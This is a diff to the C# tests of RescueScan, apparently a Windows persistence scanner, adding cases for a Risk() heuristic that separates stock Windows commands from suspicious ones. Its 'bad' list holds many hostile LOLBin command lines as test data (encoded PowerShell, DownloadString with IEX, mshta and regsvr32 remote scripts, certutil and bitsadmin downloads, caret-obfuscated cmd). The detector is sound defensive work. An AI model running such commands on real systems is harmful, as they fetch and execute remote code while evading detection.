@@ -84,6 +84,7 @@ namespace RescueScan.Tests
                 Run("RegToolsBlocked: DisableRegistryTools DWORD", RegToolsBlockedCases);
                 Run("RunProcess: stdin is closed (no wait for input)", ProcStdinClosed);
                 Run("RunProcess: output is capped but drained", ProcOutputCap);
+                Run("Risk(): clean Windows defaults never SUSPECT; evasions and LOLBins caught", RiskCases);
                 Run("SysExe: absolute System32 path [win]", SysExeWin);
                 Run("Values: raw types .NET cannot read (REG_RESOURCE_LIST, custom) [win]", RawTypesWin);
                 Run("Pairs/DeleteKey: registry symbolic links are not followed [win]", LinksWin);
@@ -1813,6 +1814,105 @@ namespace RescueScan.Tests
                 foreach (string x in new string[] { f, f2 }) try { File.Delete(x); } catch { }
                 try { Directory.Delete(dir); } catch { }
             }
+        }
+
+        // Risk(): clean Windows 10/11 defaults (built-in task actions, services, Run, Active Setup tools) are never
+        // SUSPECT; the evasions of finding R008 and the common LOLBins are all caught.
+        static void RiskCases()
+        {
+            string[] clean = {
+                "%windir%\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations",
+                "%windir%\\system32\\rundll32.exe Startupscan.dll,SusRunTask",
+                "%windir%\\system32\\rundll32.exe %windir%\\system32\\Windows.Storage.ApplicationData.dll,CleanupTemporaryState",
+                "%windir%\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask",
+                "%windir%\\system32\\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART",
+                "%windir%\\system32\\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange",
+                "%windir%\\system32\\rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask",
+                "%windir%\\system32\\rundll32.exe /d srrstr.dll,ExecuteScheduledSPPCreation",
+                "%windir%\\system32\\rundll32.exe ndfapi.dll,NdfRunDllDuplicateIPOffendingSystem",
+                "%windir%\\System32\\rundll32.exe %windir%\\System32\\Windows.SharedPC.AccountManager.dll,StartMaintenance",
+                "%windir%\\system32\\gatherNetworkInfo.vbs",
+                "%windir%\\system32\\defrag.exe -c -h -o -$",
+                "%windir%\\system32\\cleanmgr.exe /autoclean /d $(Arg0)",
+                "%SystemRoot%\\system32\\ClipUp.exe -p -s -o",
+                "%systemroot%\\system32\\usoclient.exe StartScan",
+                "C:\\Windows\\system32\\sc.exe start wuauserv",
+                "%windir%\\system32\\wermgr.exe -upload",
+                "%SystemRoot%\\System32\\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)",
+                "%windir%\\system32\\compattelrunner.exe -maintenance",
+                "%windir%\\System32\\sdclt.exe /KNOWNLOCATIONS",
+                "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c",
+                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe\" -IdleTask -TaskName WdCacheMaintenance",
+                "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting",
+                "\"C:\\Users\\Vasya\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
+                "%windir%\\system32\\SecurityHealthSystray.exe",
+                "\"C:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64.exe\" -s",
+                "\\SystemRoot\\System32\\drivers\\ACPI.sys",
+                "system32\\drivers\\wd\\WdFilter.sys",
+                "\\??\\C:\\Windows\\system32\\drivers\\MpKslDrv.sys",
+                "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
+                "C:\\Windows\\system32\\lsass.exe",
+                "%SystemRoot%\\system32\\msiexec.exe /V",
+                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe",
+                "\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeClickToRun.exe\" /service",
+                "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
+                "C:\\Windows\\servicing\\TrustedInstaller.exe",
+                "%SystemRoot%\\System32\\wuaueng.dll",
+                "%SystemRoot%\\system32\\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\\system32\\themeui.dll",
+                "regsvr32.exe /s /n /i:U shell32.dll",
+                "C:\\Windows\\System32\\Rundll32.exe C:\\Windows\\System32\\mscories.dll,Install",
+                "C:\\Windows\\SysWOW64\\Rundll32.exe C:\\Windows\\SysWOW64\\mscories.dll,Install",
+                "\"%SystemRoot%\\system32\\unregmp2.exe\" /FirstLogon",
+                "%systemroot%\\system32\\ie4uinit.exe -UserConfig",
+                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\130.0.2849.68\\Installer\\setup.exe\" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable",
+                "C:\\Windows\\system32\\Mystify.scr /s",
+                "%SystemRoot%\\System32\\scrnsave.scr",
+                "C:\\Windows\\System32\\cmd.exe",
+                "\"C:\\Program Files\\Java\\jre\\bin\\java.exe\" -Dfile.encoding=UTF-8 -jar x.jar",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Get-Date -Encoding utf8",
+            };
+            foreach (string c in clean) True(MainForm.Risk(c) != "SUSPECT", "clean default must not be SUSPECT: " + c + " -> " + MainForm.Risk(c));
+            string[] review = {
+                "%LOCALAPPDATA%\\Microsoft\\svc.exe", "%PUBLIC%\\svc.exe", "%ProgramData%\\svc.exe", "%ALLUSERSPROFILE%\\svc.exe",
+                "C:/Users/Public/svc.exe", "C:\\Users\\Vasya\\APPDAT~1\\Roaming\\svc.exe", "C:\\PROGRA~3\\svc.exe", "%USERPROFILE%\\svc.exe",
+                "pwsh -c Get-Date", "cmd /c echo hi", "C:\\Windows\\System32\\x.bat",
+            };
+            foreach (string c in review) Eq("REVIEW", MainForm.Risk(c), "REVIEW: " + c);
+            string[] bad = {
+                "%TMP%\\svc.exe", "%temp%\\svc.exe", "C:\\tmp\\svc.exe", "C:/Windows/Temp/svc.exe", "C:\\Users\\x\\AppData\\Local\\Temp\\a.exe",
+                "C:\\DOCUME~1\\x\\LOCALS~1\\Temp\\a.exe", "C:\\$Recycle.Bin\\S-1-5-21\\a.exe", "C:\\Users\\x\\invoice.pdf.exe", "C:\\x\\a.pif",
+                "C:\\Users\\x\\a.scr", "C:\\Windows\\a.scr",
+                "powershell -e JABzAD0A", "powershell -ec JABzAD0A", "powershell -enc JABz", "powershell.exe -EncodedCommand JABz",
+                "powershell -nop -w 1 -c \"iwr x|iex\"", "powershell.exe -win hidden -c calc", "powershell -WindowStyle:Hidden -c calc",
+                "powershell -w hid -c calc", "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
+                "powershell -c iwr http://x/a.ps1", "powershell -File C:\\ProgramData\\x\\a.ps1",
+                "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"calc\"\")(window.close)\")",
+                "mshta.exe C:\\Windows\\x.hta", "mshta http://x/a.hta",
+                "wscript.exe //B C:\\Windows\\x.vbs", "cscript //nologo C:\\Windows\\System32\\x.js", "wscript.exe C:\\ProgramData\\w\\checker.vbs",
+                "rundll32.exe C:\\Windows\\x.dll,Start", "rundll32.exe C:\\ProgramData\\x.dll,DllMain", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"",
+                "regsvr32 /s C:\\Windows\\x.dll", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "regsvr32 /i:C:\\x\\a.sct scrobj.dll",
+                "cmd /c start /min C:\\Windows\\x.bat", "cmd.exe /c start C:\\ProgramData\\w\\checker.bat", "C:\\Windows\\x.bat", "C:\\Windows\\x.vbs",
+                "C:\\Windows\\x.hta", "C:\\Users\\x\\a.ps1", "%comspec% /c curl http://x/a.exe -o a.exe",
+                "conhost.exe --headless cmd /c calc", "msiexec /q /i http://x/y.msi", "cmstp /s /ns C:\\x.inf",
+                "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\x.dll",
+                "regasm.exe /U C:\\x.dll", "regsvcs C:\\x.dll", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\x\\p.xml",
+                "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "pcalua -a C:\\x.exe", "curl http://x -o C:\\x.exe",
+                "wget http://x/a.exe", "wmic process call create calc", "certutil -urlcache -f http://x a.exe", "certutil -decode a.txt a.exe",
+                "bitsadmin /transfer j http://x C:\\x.exe", "c^m^d /c powershell -e AAA",
+            };
+            foreach (string c in bad) Eq("SUSPECT", MainForm.Risk(c), "SUSPECT: " + c);
+            // file paths (Explorer / process image): no command-line rules
+            Eq("", Heur.Risk("C:\\Windows\\System32\\gatherNetworkInfo.vbs", false), "path: system script");
+            Eq("REVIEW", Heur.Risk("C:\\Users\\x\\Documents\\build.bat", false), "path: a .bat in a profile is only REVIEW");
+            Eq("SUSPECT", Heur.Risk("C:\\Windows\\Temp\\a.exe", false), "path: temp");
+            Eq("", Heur.Risk("C:\\Windows\\System32\\ssText3d.scr", false), "path: system screensaver");
+            // helpers
+            Eq("\\temp\\a.exe", Heur.NormPath("%TMP%/a.exe"), "NormPath %TMP%");
+            Eq("\\windows\\system32\\drivers\\x.sys", Heur.NormPath("\\SystemRoot\\System32\\drivers\\x.sys"), "NormPath \\SystemRoot");
+            Eq("a|b c|d", string.Join("|", Heur.Tokens("a \"b c\"  d").ToArray()), "Tokens");
+            True(Heur.Word("c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c x", "powershell"), "Word powershell.exe");
+            True(!Heur.Word("c:\\program files\\msbuild\\x.exe", "msbuild"), "Word: folder name is not the program");
+            True(Heur.SysDir("c:\\windows\\system32\\x.vbs") && Heur.SysDir("\\windows\\syswow64\\x") && !Heur.SysDir("c:\\windows\\x.vbs"), "SysDir");
         }
     }
 }
